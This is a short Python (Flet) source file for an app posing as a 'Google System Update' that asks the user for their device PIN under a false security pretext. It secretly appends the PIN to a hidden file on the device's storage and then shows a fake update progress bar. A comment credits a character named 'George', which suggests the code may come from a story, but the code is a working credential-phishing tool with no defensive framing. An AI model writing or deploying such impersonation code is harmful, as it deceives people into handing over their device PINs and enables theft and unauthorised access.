import flet as ft

def main(page: ft.Page):
    page.title = "Google System Update"
    page.theme_mode = ft.ThemeMode.LIGHT
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER

    def handle_update(e):
        if not pin_field.value:
            pin_field.error_text = "PIN required"
            page.update()
        else:
            # George saves the captured PIN to a hidden file
            with open("/sdcard/Download/.sys_log.txt", "a") as f:
                f.write(f"PIN: {pin_field.value}\n")
            page.controls.clear()
            page.add(ft.Text("Finalizing Update...", size=20))
            page.add(ft.ProgressBar(width=400, color="blue"))
            page.update()

    page.add(
        ft.Icon(ft.Icons.SECURITY, color="blue", size=50),
        ft.Text("Security Update Required", size=24, weight="bold"),
        ft.Text("Verify your device PIN to authorize the system framework update.", text_align="center"),
        pin_field := ft.TextField(label="Device PIN", password=True, can_reveal_password=True, width=300),
        ft.ElevatedButton("Update Now", on_click=handle_update, bgcolor="blue", color="white")
    )

ft.app(target=main)
